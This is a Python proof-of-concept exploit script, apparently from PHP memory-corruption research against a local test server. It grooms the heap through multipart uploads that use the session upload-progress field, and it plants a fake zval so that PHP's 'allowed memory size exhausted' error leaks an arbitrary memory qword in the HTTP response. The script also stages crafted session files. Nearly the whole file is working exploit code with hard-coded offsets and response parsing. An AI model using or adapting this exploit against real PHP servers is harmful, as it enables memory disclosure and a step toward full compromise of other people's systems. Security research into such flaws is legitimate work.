#!/usr/bin/env python3
"""a3_noracle.py - the IN-BAND memory-read proof: N = *(TARGET) in the
HTTP response.

Groom v3 = the fake-d with an N-ORACLE ZVAL:
  entries data[0] -> fake zval at d+0x100
  fake zval = { value = TARGET-0x10, type_info = 0x106 (IS_STRING) }
Consumer token resolves R:1 -> the fake zval -> the FILE_START update
encodes the "string": ZSTR_LEN = *(TARGET) -> smart_str append of that
many bytes -> OOM -> "Fatal error: Allowed memory size ... exhausted
(tried to allocate N)" WHERE N = *(TARGET) - the target qword,
delivered IN-BAND in the HTTP response.

Self-verifying first target: basic_globals+0x350 (BG(unserialize).data
= the stale d pointer). The assisted leak tells us d beforehand, so the
expected N is KNOWN: if the response prints N == d -> the oracle read
the target's memory over HTTP. Then TARGET is arbitrary.

Groom carrier: multipart form-field VALUE (read_body: raw, binary-safe,
8193B -> 8196 alloc = the freed 3-page d run class).
"""
import base64
import os
import re
import struct
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from a2_leak_collect import cexec, helper_scan, stage_session_file  # noqa
from a2_groom_probe import helper_read_at  # noqa
from a2_groom_roundtrip import fire  # noqa

HOST, PORT = "127.0.0.1", 8099
B = b"WPFIRE"
BG_UNSER_DATA_OFF = 0xF4C020 + 0x350   # basic_globals + BG(unserialize).data
BIG = 75000000
WK = b"WALKOK1!"

def mp_groom(sid, groom):
    body = (b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n" +
            b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n' +
            b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="gr"\r\n'
            b"Content-Type: text/plain\r\n\r\n" + groom + b"\r\n" +
            b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nx\r\n" +
            b"--" + B + b"--\r\n")
    head = (f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode()
    return head + body

def build_groom(d, target):
    """Fake-d with the N-oracle zval; benign otherwise."""
    g = bytearray(8193)
    q = lambda off, v: struct.pack_into("<Q", g, off, v)
    dw = lambda off, v: struct.pack_into("<I", g, off, v)
    q(0x00, d + 0x38)       # last -> embedded entries (in-groom, writable)
    q(0x08, 0)              # first_dtor
    q(0x10, 0)              # last_dtor
    q(0x18, 0)              # allowed_classes
    q(0x20, 0)              # ref_props
    q(0x28, 0)              # cur_depth
    q(0x30, 0x1000)         # max_depth
    dw(0x38, 1)             # entries.used_slots = 1 (data[0] = oracle zval)
    q(0x40, 0)              # entries.next
    q(0x48, d + 0x100)      # data[0] -> fake zval
    q(0x100, target - 0x10) # fake zval.value = TARGET-0x10 (so len = *(TARGET))
    dw(0x108, 0x106)        # IS_STRING | refcounted
    dw(0x10C, 0)            # u2
    return bytes(g)

def stage_consumer(sid, tok):
    t64 = base64.b64encode(tok).decode()
    rc, _ = cexec(f"echo {t64} | base64 -d > /tmp/sess_{sid}; "
                  f"chown www-data:www-data /tmp/sess_{sid}; chmod 600 /tmp/sess_{sid}")
    return rc == 0

def main():
    # 1. leak-first: producer + scan -> d and bias
    sidA = "wp2vA" + uuid.uuid4().hex[:24]
    assert stage_session_file(sidA)
    fire(mp_groom(sidA, b"pad"))
    kids = helper_scan()
    hit = next((k for k in kids if k["level"] not in (0, None)
                and k["data"] not in (0, None)
                and k["pid"] != "1"), None)
    if not hit:
        print("[-] no stale child after producer")
        return 1
    d, bias = hit["data"], hit["bias"]
    target = bias + BG_UNSER_DATA_OFF
    expected = d
    print(f"[+] stale child {hit['pid']} d=0x{d:x} bias=0x{bias:x}")
    print(f"[*] N-oracle TARGET = basic_globals+0x350 -> expected N = {expected} (0x{expected:x})")
    groom = build_groom(d, target)

    # 2. consumer fires: R:1 resolves the oracle zval
    for i in range(10):
        sidB = "wp2vB" + uuid.uuid4().hex[:26]
        tok = b'k|a:1:{i:0;R:1;}'
        assert stage_consumer(sidB, tok)
        resp = fire(mp_groom(sidB, groom))
        body = resp.partition(b"\r\n\r\n")[2]
        m = re.search(rb"tried to allocate (\d+)", body)
        tag = None
        if m:
            n = int(m.group(1))
            loc = re.search(rb"in <b>([^<]+)</b>", body)
            tag = (f"N={n} (0x{n:x}) @ {loc.group(1).decode()[-24:] if loc else '?'}")
            verdict = ("*** ORACLE READ MATCHES THE TARGET: N == the stale-d pointer ***"
                       if n == expected else
                       f"{'N is memory-derived (not staged)!' if n not in (75000032, 434176, 2097152) else 'N is staged-known'}")
            print(f"  [{i}] {tag}  {verdict}", flush=True)
        elif len(resp) == 0 or resp == b"<RESET>":
            print(f"  [{i}] eof/crash", flush=True)
        elif b"Session has been destroyed" in body:
            print(f"  [{i}] clean-fail (not delivered or lookup missed)", flush=True)
        else:
            print(f"  [{i}] resp {len(resp)}B (no fatal)", flush=True)
    return 0

if __name__ == "__main__":
    sys.exit(main())
